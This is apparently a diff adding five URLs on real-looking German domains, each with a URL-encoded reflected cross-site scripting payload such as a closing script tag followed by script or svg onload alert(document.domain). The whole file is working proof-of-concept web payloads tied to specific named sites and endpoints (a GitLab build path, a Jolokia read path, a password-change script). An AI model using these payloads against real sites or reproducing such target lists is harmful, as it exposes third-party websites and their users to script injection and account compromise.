@@ -1,0 +1,5 @@
+http://extraflex.de/gitlab/build_now%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://fahrraddirektverkauf.de/page/1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://faire-geschenke.de/unauth/php/change_password.php/%22%3E%3Csvg%2Fonload%3Dalert(1)%3E
+http://fair-risk.de/status%3E%3Cscript%3Ealert(31337)%3C%2Fscript%3E
+http://falken4you.de/jolokia/read%3Csvg%20onload=alert%28document.domain%29%3E?mimeType=text/html
